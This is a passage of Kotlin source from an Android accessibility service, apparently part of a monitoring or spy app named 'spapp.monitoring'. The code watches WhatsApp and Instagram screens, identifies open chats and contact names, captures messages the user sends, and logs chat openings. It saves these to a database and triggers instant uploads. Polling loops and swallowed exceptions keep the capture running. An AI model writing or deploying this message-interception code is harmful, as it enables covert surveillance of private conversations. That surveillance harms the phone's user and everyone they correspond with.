                            pollHandler.postDelayed({ try { recordInstagramChatIfForeground(getInstagramWindowRoot()) } catch (_: Throwable) {} }, 1000L)
                        } else if (cDesc.contains("back", ignoreCase = true) || cDesc.contains("navigate up", ignoreCase = true) || cId.endsWith(":id/action_bar_button_back")) {
                            lastClickedInstagramChat = null
                            lastInstagramComposerText = null
                            lastActiveInstagramChatForSignatures = null
                            currentInstagramChatSeenSignatures.clear()
                        } else if (!inConv) {
                            var rowContainer = clickedNode
                            var upCount = 0
                            val displayMetrics = resources.displayMetrics
                            val screenW = displayMetrics.widthPixels
                            while (rowContainer?.parent != null && upCount < 6) {
                                val r = Rect()
                                rowContainer.getBoundsInScreen(r)
                                if (r.height() in 110..550 && r.width() > screenW * 0.65f) {
                                    break
                                }
                                rowContainer = rowContainer.parent
                                upCount++
                            }

                            val texts = mutableListOf<String>()
                            val profileNames = mutableListOf<String>()
                            fun walkClick(n: AccessibilityNodeInfo?, d: Int = 0) {
                                if (n == null || d > 12) return
                                try {
                                    val t = n.text?.toString()?.trim()
                                    if (!t.isNullOrBlank()) {
                                        val extT = extractInstagramNameFromDesc(t)
                                        if (extT != null && !isInstagramReservedTitle(extT)) {
                                            profileNames.add(extT)
                                        } else if (!isInstagramReservedTitle(t)) {
                                            texts.add(t)
                                        }
                                    }
                                    val cd = n.contentDescription?.toString()?.trim()
                                    if (!cd.isNullOrBlank() && cd != t) {
                                        val extCd = extractInstagramNameFromDesc(cd)
                                        if (extCd != null && !isInstagramReservedTitle(extCd)) {
                                            profileNames.add(extCd)
                                        } else if (!isInstagramReservedTitle(cd)) {
                                            texts.add(cd)
                                        }
                                    }
                                    for (i in 0 until n.childCount) {
                                        try {
                                            walkClick(n.getChild(i), d + 1)
                                        } catch (_: Exception) {}
                                    }
                                } catch (_: Exception) {}
                            }
                            walkClick(rowContainer ?: clickedNode)
                            val titleCand = profileNames.firstOrNull() ?: texts.firstOrNull { 
                                it.length in 2..50 && !it.contains(":") && !isInstagramReservedTitle(it)
                            }
                            if (!titleCand.isNullOrBlank()) {
                                lastClickedInstagramChat = titleCand
                                lastClickedInstagramChatTime = System.currentTimeMillis()
                                lastActiveInstagramChatForSignatures = titleCand
                                currentInstagramChatSeenSignatures.clear()
                                recordInstagramChatOpened(titleCand)
                                pollHandler.postDelayed({ try { recordInstagramChatIfForeground(getInstagramWindowRoot()) } catch (_: Throwable) {} }, 300L)
                                pollHandler.postDelayed({ try { recordInstagramChatIfForeground(getInstagramWindowRoot()) } catch (_: Throwable) {} }, 700L)
                                pollHandler.postDelayed({ try { recordInstagramChatIfForeground(getInstagramWindowRoot()) } catch (_: Throwable) {} }, 1200L)
                                pollHandler.postDelayed({ try { recordInstagramChatIfForeground(getInstagramWindowRoot()) } catch (_: Throwable) {} }, 2000L)
                            }
                        }
                    }
                } catch (_: Throwable) {}
            }

            // Detect send via soft keyboard Enter key
            if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED || eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                try {
                    val entryNode = findInstagramComposerNode(igRoot)
                    if (entryNode != null) {
                        val newText = entryNode.text?.toString()?.trim()
                        val isNowEmpty = newText.isNullOrBlank() || newText.equals("Message...", ignoreCase = true)
                        if (isNowEmpty && !lastInstagramComposerText.isNullOrBlank()) {
                            val sentText = lastInstagramComposerText!!
                            val chatTitle = getInstagramCurrentChatTitle(igRoot) ?: lastActiveInstagramChatForSignatures ?: lastClickedInstagramChat
                            if (!chatTitle.isNullOrBlank()) {
                                val now = System.currentTimeMillis()
                                recordRecentSentInstagramText(sentText)
                                val dedupeKey = "ig|$chatTitle|$sentText|true|text"
                                if (shouldCaptureMessage(dedupeKey, 1500L)) {
                                    scope.launch {
                                        try {
                                            val db = AppDatabase.getInstance(applicationContext)
                                            db.instagramMessageDao().updateToOutgoing(chatTitle, sentText, now - 60_000L)
                                            val existingId = db.instagramMessageDao().findExistingRecent(
                                                chatTitle, sentText, true, now - 2_000L
                                            )
                                            if (existingId == null) {
                                                db.instagramMessageDao().insertAll(
                                                    listOf(
                                                        InstagramMessageEntry(
                                                            chatName = chatTitle,
                                                            sender = "me",
                                                            messageText = sentText,
                                                            isOutgoing = true,
                                                            messageTimeEpochMs = now,
                                                            mediaType = "text"
                                                        )
                                                    )
                                                )
                                                com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext, immediate = true)
                                            }
                                        } catch (_: Throwable) {}
                                    }
                                }
                            }
                            lastInstagramComposerText = null
                        }
                    }
                } catch (_: Throwable) {}
            }

            val shouldInspectIg = when (eventType) {
                AccessibilityEvent.TYPE_VIEW_CLICKED,
                AccessibilityEvent.TYPE_VIEW_SCROLLED,
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> true
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                    val nowMs = System.currentTimeMillis()
                    if (nowMs - lastIgContentInspectAt >= 350L) {
                        lastIgContentInspectAt = nowMs
                        true
                    } else false
                }
                else -> false
            }
            if (shouldInspectIg) {
                val nodeToInspect = getInstagramWindowRoot(event.source ?: rootInActiveWindow)
                recordInstagramChatIfForeground(nodeToInspect)
            }
        }
        } catch (t: Throwable) {
            Log.e(TAG, "Trapped unhandled exception in onAccessibilityEvent to prevent service unbind", t)
        }
    }

    /**
     * Periodically inspects WhatsApp's active conversation window while WhatsApp is foreground.
     */
    private var whatsAppPollRunnable: Runnable? = null
    private val whatsAppPollIntervalMs = 2000L
    private var lastWaContentInspectAt = 0L
    private var lastIgContentInspectAt = 0L
    private val recentCapturedMsgTimeMap = java.util.Collections.synchronizedMap(
        object : java.util.LinkedHashMap<String, Long>(300, 0.75f, true) {
            override fun removeEldestEntry(eldest: MutableMap.MutableEntry<String, Long>?): Boolean {
                return size > 1000
            }
        }
    )

    private fun shouldCaptureMessage(key: String, windowMs: Long = 3000L): Boolean {
        val now = System.currentTimeMillis()
        val last = recentCapturedMsgTimeMap[key]
        if (last == null || (now - last) > windowMs) {
            recentCapturedMsgTimeMap[key] = now
            return true
        }
        return false
    }
    private var lastClickedWhatsAppChat: String? = null
    private var lastClickedWhatsAppChatTime: Long = 0L
    private var lastWhatsAppComposerText: String? = null
    private val recentSentWhatsAppTexts = java.util.concurrent.ConcurrentHashMap<String, Long>()
    val currentChatSeenSignatures = java.util.Collections.synchronizedSet(java.util.HashSet<String>())
    var lastActiveChatForSignatures: String? = null

    private var lastClickedInstagramChat: String? = null
    private var lastClickedInstagramChatTime: Long = 0L
    private var lastInstagramComposerText: String? = null
    private val recentSentInstagramTexts = java.util.concurrent.ConcurrentHashMap<String, Long>()
    val currentInstagramChatSeenSignatures = java.util.Collections.synchronizedSet(java.util.HashSet<String>())
    var lastActiveInstagramChatForSignatures: String? = null

    private fun recordRecentSentWhatsAppText(text: String?) {
        if (text.isNullOrBlank()) return
        val clean = text.lowercase().trim()
        val now = System.currentTimeMillis()
        recentSentWhatsAppTexts[clean] = now
        val iterator = recentSentWhatsAppTexts.entries.iterator()
        while (iterator.hasNext()) {
            val entry = iterator.next()
            if (now - entry.value > 120_000L) {
                iterator.remove()
            }
        }
    }

    private fun recordRecentSentInstagramText(text: String?) {
        if (text.isNullOrBlank()) return
        val clean = text.lowercase().trim()
        val now = System.currentTimeMillis()
        recentSentInstagramTexts[clean] = now
        val iterator = recentSentInstagramTexts.entries.iterator()
        while (iterator.hasNext()) {
            val entry = iterator.next()
            if (now - entry.value > 120_000L) {
                iterator.remove()
            }
        }
    }

    fun getWhatsAppWindowRoot(fallback: AccessibilityNodeInfo? = null): AccessibilityNodeInfo? {
        var candidate = fallback
        while (candidate?.parent != null) {
            candidate = candidate.parent
        }
        val candPkg = candidate?.packageName?.toString() ?: ""
        if (candPkg == "com.whatsapp" || candPkg == "com.whatsapp.w4b") {
            return candidate
        }

        try {
            var active = rootInActiveWindow
            while (active?.parent != null) {
                active = active.parent
            }
            val activePkg = active?.packageName?.toString() ?: ""
            if (activePkg == "com.whatsapp" || activePkg == "com.whatsapp.w4b") {
                return active
            }
        } catch (_: Exception) {}

        try {
            val appWindow = windows?.firstOrNull {
                it.type == android.view.accessibility.AccessibilityWindowInfo.TYPE_APPLICATION &&
                (it.root?.packageName == "com.whatsapp" || it.root?.packageName == "com.whatsapp.w4b")
            }
            if (appWindow?.root != null) {
                var wRoot = appWindow.root
                while (wRoot?.parent != null) {
                    wRoot = wRoot.parent
                }
                return wRoot
            }
        } catch (_: Exception) {}

        return candidate ?: try { rootInActiveWindow } catch (_: Exception) { null }
    }

    private fun startWhatsAppPolling() {
        if (whatsAppPollRunnable != null) return
        val runnable = object : Runnable {
            override fun run() {
                try {
                    val root = getWhatsAppWindowRoot()
                    val pkg = root?.packageName?.toString() ?: ""
                    if (pkg == "com.whatsapp" || pkg == "com.whatsapp.w4b" ||
                        currentForegroundApp == "com.whatsapp" || currentForegroundApp == "com.whatsapp.w4b") {
                        if (pkg == "com.whatsapp" || pkg == "com.whatsapp.w4b") {
                            recordWhatsAppChatIfForeground(root)
                        }
                        pollHandler.postDelayed(this, whatsAppPollIntervalMs)
                    } else {
                        whatsAppPollRunnable = null
                    }
                } catch (t: Throwable) {
                    Log.e(TAG, "Error in WhatsApp polling loop", t)
                    pollHandler.postDelayed(this, whatsAppPollIntervalMs)
                }
            }
        }
        whatsAppPollRunnable = runnable
        pollHandler.postDelayed(runnable, 500L)
    }

    private fun stopWhatsAppPolling() {
        val root = getWhatsAppWindowRoot()
        val pkg = root?.packageName?.toString() ?: ""
        if (pkg == "com.whatsapp" || pkg == "com.whatsapp.w4b" ||
            currentForegroundApp == "com.whatsapp" || currentForegroundApp == "com.whatsapp.w4b") {
            // WhatsApp is still active in foreground/behind keyboard, do not stop polling!
            return
        }
        whatsAppPollRunnable?.let { pollHandler.removeCallbacks(it) }
        whatsAppPollRunnable = null
    }

    fun findWhatsAppComposerNode(root: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        if (root == null) return null
        try {
            val byId = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/entry")
            if (!byId.isNullOrEmpty()) return byId[0]
        } catch (_: Exception) {}

        val screenHeight = try { resources.displayMetrics.heightPixels } catch (_: Exception) { 2000 }
        var found: AccessibilityNodeInfo? = null

        fun search(node: AccessibilityNodeInfo?, depth: Int = 0) {
            if (node == null || depth > 35 || found != null) return
            try {
                if (node.isEditable || node.className?.toString()?.contains("EditText", ignoreCase = true) == true) {
                    val rect = Rect()
                    node.getBoundsInScreen(rect)
                    val id = (node.viewIdResourceName ?: "").lowercase()
                    val hint = (node.hintText?.toString() ?: "").lowercase()
                    val desc = (node.contentDescription?.toString() ?: "").lowercase()
                    if (!id.contains("search") && !desc.contains("search") && !hint.contains("search") && !hint.contains("meta ai")) {
                        if (rect.bottom > screenHeight * 0.35f) {
                            found = node
                            return
                        }
                    }
                }
                for (i in 0 until node.childCount) {
                    search(node.getChild(i), depth + 1)
                    if (found != null) return
                }
            } catch (_: Exception) {}
        }
        search(root)
        return found
    }

    fun findInstagramComposerNode(root: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        if (root == null) return null
        try {
            val byId = root.findAccessibilityNodeInfosByViewId("com.instagram.android:id/row_thread_composer_edittext")
            if (!byId.isNullOrEmpty()) return byId[0]
        } catch (_: Exception) {}

        val screenHeight = try { resources.displayMetrics.heightPixels } catch (_: Exception) { 2000 }
        var found: AccessibilityNodeInfo? = null

        fun search(node: AccessibilityNodeInfo?, depth: Int = 0) {
            if (node == null || depth > 35 || found != null) return
            try {
                if (node.isEditable || node.className?.toString()?.contains("EditText", ignoreCase = true) == true) {
                    val rect = Rect()
                    node.getBoundsInScreen(rect)
                    val id = (node.viewIdResourceName ?: "").lowercase()
                    val hint = (node.hintText?.toString() ?: "").lowercase()
                    val desc = (node.contentDescription?.toString() ?: "").lowercase()
                    if (!id.contains("search") && !desc.contains("search") && !hint.contains("search")) {
                        if (rect.bottom > screenHeight * 0.35f) {
                            found = node
                            return
                        }
                    }
                }
                for (i in 0 until node.childCount) {
                    search(node.getChild(i), depth + 1)
                    if (found != null) return
                }
            } catch (_: Exception) {}
        }
        search(root)
        return found
    }

    fun isWhatsAppMainScreen(root: AccessibilityNodeInfo?): Boolean {
        if (root == null) return false
        var hasMainTab = false
        var hasTopLeftBack = false
        val screenHeight = try { resources.displayMetrics.heightPixels } catch (_: Exception) { 2000 }
        val screenWidth = try { resources.displayMetrics.widthPixels } catch (_: Exception) { 1080 }

        fun checkNode(n: AccessibilityNodeInfo?, depth: Int = 0) {
            if (n == null || depth > 20) return
            try {
                val rect = Rect()
                n.getBoundsInScreen(rect)
                val t = (n.text?.toString() ?: "").trim().lowercase()
                val desc = (n.contentDescription?.toString() ?: "").trim().lowercase()
                val id = (n.viewIdResourceName ?: "").lowercase()

                if (rect.top < screenHeight * 0.25f && rect.left < screenWidth * 0.35f) {
                    if (id.endsWith(":id/back") || id.endsWith(":id/whatsapp_toolbar_home") ||
                        desc.contains("navigate up") || desc.contains("back") || desc == "back") {
                        hasTopLeftBack = true
                    }
                }
                val inTabBarZone = rect.top > screenHeight * 0.78f || rect.bottom < screenHeight * 0.25f
                if (inTabBarZone && (t == "chats" || desc == "chats" || desc.contains("chats tab") || desc.contains("tab, 1 of") ||
                    t == "updates" || desc == "updates" || t == "communities" || desc == "communities" || t == "calls" || desc == "calls")) {
                    hasMainTab = true
                }
                if (hasMainTab && hasTopLeftBack) return
                for (i in 0 until n.childCount) {
                    checkNode(n.getChild(i), depth + 1)
                    if (hasMainTab && hasTopLeftBack) return
                }
            } catch (_: Throwable) {}
        }
        checkNode(root)
        return hasMainTab && !hasTopLeftBack
    }

    fun isInsideWhatsAppConversation(root: AccessibilityNodeInfo?): Boolean {
        if (root == null) return false
        val screenHeight = try { resources.displayMetrics.heightPixels } catch (_: Exception) { 2000 }
        val screenWidth = try { resources.displayMetrics.widthPixels } catch (_: Exception) { 1080 }

        // 1. Direct view ID / composer check: com.whatsapp:id/entry is 100% inside a conversation
        try {
            val entryNodes = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/entry")
            if (!entryNodes.isNullOrEmpty()) return true
            val w4bNodes = root.findAccessibilityNodeInfosByViewId("com.whatsapp.w4b:id/entry")
            if (!w4bNodes.isNullOrEmpty()) return true
        } catch (_: Exception) {}

        if (findWhatsAppComposerNode(root) != null) return true
        if (isWhatsAppMainScreen(root)) return false

        // 2. Structural verification:
        // A conversation screen ALWAYS has a Back / Navigate Up button in the top-left action bar
        // or an active message composer in the lower portion of the screen.
        var hasTopLeftBack = false
        var hasBottomComposer = false

        fun inspect(n: AccessibilityNodeInfo?, depth: Int = 0) {
            if (n == null || depth > 35) return
            try {
                val rect = Rect()
                n.getBoundsInScreen(rect)

                val id = (n.viewIdResourceName ?: "").lowercase()
                val desc = (n.contentDescription?.toString() ?: "").trim().lowercase()
                val text = (n.text?.toString() ?: "").trim().lowercase()
                val hint = (n.hintText?.toString() ?: "").trim().lowercase()

                // Back button in top-left (top 25%, left 35%)
                if (rect.top < screenHeight * 0.25f && rect.left < screenWidth * 0.35f) {
                    val isBackDesc = id.endsWith(":id/back") || id.endsWith(":id/whatsapp_toolbar_home") ||
                                     desc.contains("navigate up") || desc.contains("back") || desc == "back"
                    val isTopLeftClickable = n.isClickable && rect.width() < screenWidth * 0.30f && !id.contains("camera") && !desc.contains("camera")
                    if (isBackDesc || isTopLeftClickable) {
                        hasTopLeftBack = true
                    }
                }

                // Message input / composer (strictly in lower 40% of screen, excluding search & Meta AI)
                val isBottomZone = rect.bottom > screenHeight * 0.60f
                if (isBottomZone) {
                    if (n.isEditable || n.className?.toString()?.contains("EditText", true) == true) {
                        if (!id.contains("search") && !desc.contains("search") && !hint.contains("search") && !hint.contains("meta ai")) {
                            hasBottomComposer = true
                        }
                    }
                    if (text == "type a message" || hint == "type a message" || text == "message" || hint == "message" ||
                        id.endsWith(":id/entry") || id.contains("conversation_entry")) {
                        hasBottomComposer = true
                    }
                }

                if (hasTopLeftBack && hasBottomComposer) return

                for (i in 0 until n.childCount) {
                    inspect(n.getChild(i), depth + 1)
                    if (hasTopLeftBack && hasBottomComposer) return
                }
            } catch (_: Throwable) {}
        }
        inspect(root)

        return hasBottomComposer || hasTopLeftBack
    }

    fun hasWhatsAppChatComposer(root: AccessibilityNodeInfo?): Boolean {
        return isInsideWhatsAppConversation(root)
    }

    fun isWhatsAppReservedTitle(t: String?): Boolean {
        if (t.isNullOrBlank()) return true
        val reserved = setOf(
            "WhatsApp", "WhatsApp Business", "Chats", "Updates", "Calls", "Communities",
            "Settings", "Search", "Archived", "Unread", "Groups", "All",
            "Online", "Typing...", "Typing", "Audio call", "Video call", "Voice call", "Call",
            "More options", "Back", "Navigate up", "Camera", "Attach", "Send",
            "Disappearing messages", "Profile photo", "Profile picture", "View contact",
            "Group info", "Custom", "Status", "Emoji", "Sticker", "Stickers", "GIF", "Gallery",
            "Audio", "Location", "Contact", "Poll", "Document", "Voice message", "Voice note",
            "Scroll to bottom", "Unread messages",
            "Add status", "My status", "New chat", "New group", "New community",
            "New broadcast", "Linked devices", "Starred messages", "Payments", "Select contact",
            "WhatsApp Web", "WhatsApp Group", "WhatsApp Status", "Ask Meta AI or Search",
            "Meta AI", "Ask Meta AI", "Message yourself",
            "Add to contacts", "Block", "Report", "Business account", "Official business account",
            "Security code changed", "Downloading document", "Downloading", "Download complete", "Downloading..."
        )
        val trimmed = t.trim()
        if (reserved.any { it.equals(trimmed, ignoreCase = true) }) return true
        if (trimmed.equals("Meta AI", ignoreCase = true)) return true
        if (trimmed.equals("Ask Meta AI", ignoreCase = true)) return true
        if (trimmed.contains("messages from", ignoreCase = true) && trimmed.contains("chats", ignoreCase = true)) return true
        if (trimmed.startsWith("Filter by", ignoreCase = true)) return true
        if (trimmed.contains("tap here", ignoreCase = true)) return true
        return false
    }

    fun isInsideInstagramConversation(root: AccessibilityNodeInfo?): Boolean {
        if (root == null) return false
        val screenHeight = try { resources.displayMetrics.heightPixels } catch (_: Exception) { 2000 }
        val screenWidth = try { resources.displayMetrics.widthPixels } catch (_: Exception) { 1080 }

        // 1. Direct view ID check: row_thread_composer_edittext is 100% inside an Instagram DM conversation
        try {
            val composerNodes = root.findAccessibilityNodeInfosByViewId("com.instagram.android:id/row_thread_composer_edittext")
            if (!composerNodes.isNullOrEmpty()) return true
        } catch (_: Exception) {}

        // 2. Structural verification:
        // A conversation screen in Instagram has:
        // - A Back / Navigate Up button in top-left (top 22%, left 35%)
        // - A Message Composer in the lower screen (bottom > 45%)
        // - NO main bottom navigation bar (Home, Reels, Search, Profile)
        var hasTopLeftBack = false
        var hasBottomComposer = false
        var hasMainBottomNav = false
        var hasCallOrThreadInfo = false

        fun inspect(n: AccessibilityNodeInfo?, depth: Int = 0) {
            if (n == null || depth > 35) return
            try {
                val rect = Rect()
                n.getBoundsInScreen(rect)

                val id = (n.viewIdResourceName ?: "").lowercase()
                val desc = (n.contentDescription?.toString() ?: "").trim().lowercase()
                val text = (n.text?.toString() ?: "").trim().lowercase()
                val hint = (n.hintText?.toString() ?: "").trim().lowercase()

                // Detect Main Bottom Navigation Bar (Home, Reels, Search, Profile)
                if (rect.bottom > screenHeight * 0.90f && rect.top > screenHeight * 0.82f) {
                    if (desc == "home" || desc == "search and explore" || desc == "reels" ||
                        desc == "profile" || desc == "profile tab" ||
                        id.endsWith(":id/tab_bar") || id.endsWith(":id/bottom_navigation_bar")) {
                        hasMainBottomNav = true
                    }
                }

                // Back button in top-left (top 22%, left 35%)
                if (rect.top < screenHeight * 0.22f && rect.left < screenWidth * 0.35f) {
                    val isBack = id.contains("back") || desc == "back" || desc.contains("navigate up") ||
                                 (n.isClickable && rect.width() < screenWidth * 0.25f && !id.contains("camera") && !desc.contains("camera"))
                    if (isBack) {
                        hasTopLeftBack = true
                    }
                }

                // Detect Call / Details buttons in header (strictly conversation action bar)
                if (rect.top < screenHeight * 0.22f) {
                    if (desc.contains("audio call") || desc.contains("video call") || desc.contains("voice call") ||
                        desc.contains("details") || id.contains("action_bar_call") || id.contains("thread_details") ||
                        id.contains("direct_thread")) {
                        hasCallOrThreadInfo = true
                    }
                }

                // Message Composer in bottom portion (strictly lower 55% of screen, excluding search & comment)
                val isLowerScreen = rect.bottom > screenHeight * 0.45f
                if (isLowerScreen) {
                    val isComposerId = id.contains("composer_edittext") || id.contains("row_thread_composer")
                    val isComposerText = text == "message..." || hint == "message..." || text.startsWith("message ") || hint.startsWith("message ") ||
                                         desc.contains("message...") || desc.contains("send message")
                    val isEditText = n.isEditable && (n.className?.toString()?.contains("EditText", true) == true)
                    if (isComposerId || isComposerText || (isEditText && !id.contains("search") && !desc.contains("search") && !hint.contains("comment"))) {
                        hasBottomComposer = true
                    }
                }

                if (hasMainBottomNav) return

                for (i in 0 until n.childCount) {
                    inspect(n.getChild(i), depth + 1)
                    if (hasMainBottomNav) return
                }
            } catch (_: Throwable) {}
        }
        inspect(root)

        val hasComposer = hasBottomComposer || findInstagramComposerNode(root) != null
        if (hasComposer) return true
        if (hasMainBottomNav) return false
        return hasTopLeftBack && hasCallOrThreadInfo
    }

    fun isInstagramReservedTitle(t: String?): Boolean {
        if (t.isNullOrBlank()) return true
        val trimmed = t.trim()
        val lower = trimmed.lowercase()

        val reserved = setOf(
            "instagram", "instagram home feed", "direct", "messages", "search", "search or ask meta ai",
            "reels", "explore", "reels tray container", "your note", "your story", "close friends",
            "turn sound on", "turn sound off", "view tagged people", "install now", "sign up",
            "suggested for you", "made with edits", "more options", "back", "navigate up",
            "audio call", "video call", "details", "info", "active now", "active today",
            "home", "activity", "notifications", "post", "posts", "audio", "tagged", "comments",
            "likes", "share", "save", "download", "camera", "create", "settings",
            "profile", "edit profile", "share profile", "professional dashboard",
            "archive", "requests", "primary", "general", "channels", "chatgpt",
            "photo", "photos", "video", "videos", "reel", "reels", "sticker", "stickers",
            "voice message", "voice note", "gallery", "more", "send", "verified",
            "forward message", "riff cutout icon", "blend", "double tap to like",
            "tap and hold to react", "tap to reply", "sending…", "sending...", "sending",
            "delivered", "seen", "typing", "typing...", "typing…", "view profile",
            "tap for info", "replied to themself", "you replied", "message...", "type a message..."
        )
        if (reserved.contains(lower)) return true

        // Subtitle separator in chat list
        if (lower.contains("•") || lower.contains("·")) return true

        // Status, snippet or action phrases
        if (lower.startsWith("sent a ") || lower.startsWith("shared a ") || lower.startsWith("liked a ") ||
            lower.startsWith("voice message") || lower.startsWith("replied to ") || lower.startsWith("reacted ") ||
            lower.startsWith("active ") || lower.startsWith("seen ") || lower.startsWith("typing ")
        ) return true

        if (lower.startsWith("profile photo") || lower.startsWith("profile picture") ||
            lower.endsWith("profile photo") || lower.endsWith("profile picture") ||
            lower.startsWith("photo of ") || lower.startsWith("view photo of ")
        ) return true

        if (lower.startsWith("switched to") || lower.startsWith("switch to") || lower.startsWith("logged in")) return true
        if (lower.contains("posted a video") || lower.contains("posted a photo") || lower.contains("shared a post")) return true
        if (lower.contains("reels tray") || lower.contains("tagged people") || lower.contains("turn sound")) return true
        if (lower.contains("similar ads")) return true
        if (lower.matches("""^[\d,\.]+$""".toRegex())) return true
        if (WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(trimmed)) return true
        return false
    }

    fun extractWhatsAppNameFromDesc(desc: String?): String? {
        if (desc.isNullOrBlank()) return null
        val d = desc.trim()
        val prefixes = listOf("Profile photo of ", "Profile picture of ", "View photo of ", "Photo of ")
        for (p in prefixes) {
            if (d.startsWith(p, ignoreCase = true)) {
                val name = d.substring(p.length).trim()
                if (name.length in 1..60 && !isWhatsAppReservedTitle(name)) {
                    return name
                }
            }
        }
        val suffixes = listOf(
            "'s profile photo", "'s profile picture", "’s profile photo", "’s profile picture",
            ", tap for contact info", ", tap for group info", ", tap for info",
            ", tap to view profile", ", online", ", audio call button", ", video call button"
        )
        for (s in suffixes) {
            if (d.contains(s, ignoreCase = true)) {
                val name = d.substring(0, d.indexOf(s, ignoreCase = true)).trim()
                if (name.length in 1..60 && !isWhatsAppReservedTitle(name)) {
                    return name
                }
            }
        }
        return null
    }

    private fun recordWhatsAppChatOpened(chatTitle: String) {
        if (chatTitle.isBlank() || isWhatsAppReservedTitle(chatTitle)) return
        val now = System.currentTimeMillis()
        val key = "wa_open|$chatTitle"
        if (shouldCaptureMessage(key, 3_000L)) {
            scope.launch {
                try {
                    val db = AppDatabase.getInstance(applicationContext)
                    val existing = db.whatsAppMessageDao().findExistingRecent(
                        chatTitle, "Opened chat", false, now - 60_000L
                    )
                    if (existing == null) {
                        db.whatsAppMessageDao().insertAll(
                            listOf(
                                WhatsAppMessageEntry(
                                    chatName = chatTitle,
                                    sender = chatTitle,
                                    messageText = "Opened chat",
                                    isOutgoing = false,
                                    messageTimeEpochMs = now,
                                    mediaType = "text"
                                )
                            )
                        )
                        com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext, immediate = true)
                    }
                } catch (_: Throwable) {}
            }
        }
    }

    private fun isWhatsAppUiMetadataOrTimestamp(text: String?): Boolean {
        if (text.isNullOrBlank()) return true
        val t = text.replace("•", "").replace("·", "").trim()
        if (t.isBlank()) return true
        // 1. Exact times: "3:25 PM", "03:25 pm", "15:45", "15:45:00", "3:25", "3.25 PM", "3:25pm"
        if ("""^\d{1,2}[:.]\d{2}(?::\d{2})?(\s*(?:AM|PM|am|pm))?$""".toRegex(RegexOption.IGNORE_CASE).matches(t)) return true
        // 2. Day names with optional time: "Yesterday", "Today", "Tomorrow", "Yesterday at 3:25 PM", "Today 10:14 AM"
        if ("""^(?:Yesterday|Today|Tomorrow|Monday|Tuesday|Wednesday|Thursday|Friday|Saturday|Sunday)(?:\s+(?:at\s+)?\d{1,2}[:.]\d{2}(?:\s*(?:AM|PM|am|pm))?)?$""".toRegex(RegexOption.IGNORE_CASE).matches(t)) return true
        // 3. Month names with dates: "Oct 17", "17 Oct", "October 17, 2026", "Oct 17 at 3:25 PM"
        if ("""^(?:(?:Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)[a-z]*\s+\d{1,2}|\d{1,2}\s+(?:Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)[a-z]*)(?:,?\s*\d{4})?(?:\s+(?:at\s+)?\d{1,2}[:.]\d{2}(?:\s*(?:AM|PM|am|pm))?)?$""".toRegex(RegexOption.IGNORE_CASE).matches(t)) return true
        // 4. Standard numeric dates: "17/10/2026", "2026-10-17"
        if ("""^\d{1,4}[-/\.]\d{1,2}[-/\.]\d{1,4}(?:\s+(?:at\s+)?\d{1,2}[:.]\d{2}(?:\s*(?:AM|PM|am|pm))?)?$""".toRegex(RegexOption.IGNORE_CASE).matches(t)) return true
        // 5. Activity status / delivery receipts
        if ("""^(?:Delivered(?:\s+\d+\w*\s+ago)?|Read(?:\s+\d+\w*\s+ago)?|Seen(?:\s+just\s+now|\s+\d+\w*\s+ago|\s+yesterday)?|Sent(?:\s+\d+\w*\s+ago)?|Pending|Sending(?:[\.…\s].*)?|Typing(?:[\.…\s].*)?|Online)$""".toRegex(RegexOption.IGNORE_CASE).matches(t)) return true
        // 6. WhatsApp UI placeholders, composer icons & encryption banners
        if (t.contains("end-to-end encrypted", ignoreCase = true) ||
            t.equals("Type a message", ignoreCase = true) ||
            t.equals("Message", ignoreCase = true) ||
            t.equals("Search", ignoreCase = true) ||
            t.equals("This message was deleted", ignoreCase = true) ||
            t.equals("You deleted this message", ignoreCase = true) ||
            t.startsWith("You reacted ", ignoreCase = true) ||
            t.startsWith("Reacted ", ignoreCase = true) ||
            t.startsWith("Reactions:", ignoreCase = true) ||
            t.startsWith("Forwarded", ignoreCase = true) ||
            t.equals("WhatsApp", ignoreCase = true) ||
            t.equals("WhatsApp Business", ignoreCase = true) ||
            t.equals("Back", ignoreCase = true) ||
            t.equals("Navigate up", ignoreCase = true) ||
            t.equals("More options", ignoreCase = true) ||
            t.equals("Message yourself", ignoreCase = true) ||
            t.equals("Seen", ignoreCase = true) ||
            t.startsWith("Forward ", ignoreCase = true) ||
            t.equals("Forward", ignoreCase = true) ||
            t.equals("Camera", ignoreCase = true) ||
            t.equals("Send", ignoreCase = true) ||
            t.equals("Attach", ignoreCase = true) ||
            t.equals("Payment", ignoreCase = true) ||
            t.equals("Emoji", ignoreCase = true) ||
            t.equals("Sticker", ignoreCase = true) ||
            t.equals("Stickers", ignoreCase = true) ||
            t.equals("GIF", ignoreCase = true) ||
            t.equals("Gallery", ignoreCase = true) ||
            t.startsWith("Voice message", ignoreCase = true) ||
            t.equals("Voice note", ignoreCase = true) ||
            t.equals("Audio call", ignoreCase = true) ||
            t.equals("Video call", ignoreCase = true) ||
            t.equals("Voice call", ignoreCase = true) ||
            t.equals("Scroll to bottom", ignoreCase = true) ||
            t.equals("Unread messages", ignoreCase = true) ||
            t.equals("Profile photo", ignoreCase = true) ||
            t.equals("Profile picture", ignoreCase = true) ||
            t.contains("tap for contact info", ignoreCase = true) ||
            t.contains("tap for group info", ignoreCase = true) ||
            t.equals("Add status", ignoreCase = true) ||
            t.equals("My status", ignoreCase = true) ||
            t.equals("Select contact", ignoreCase = true) ||
            t.equals("New chat", ignoreCase = true) ||
            t.equals("New group", ignoreCase = true) ||
            t.equals("APK", ignoreCase = true) ||
            t.matches("""^\d+(\.\d+)?\s*(?:MB|KB|GB|B|bytes)$""".toRegex(RegexOption.IGNORE_CASE)) ||
            t.matches("""^[\w\-\s]+\.(?:apk|pdf|mp3|mp4|zip|rar|docx|xlsx)$""".toRegex(RegexOption.IGNORE_CASE))
        ) return true
        // 7. Time at start with length <= 25 chars
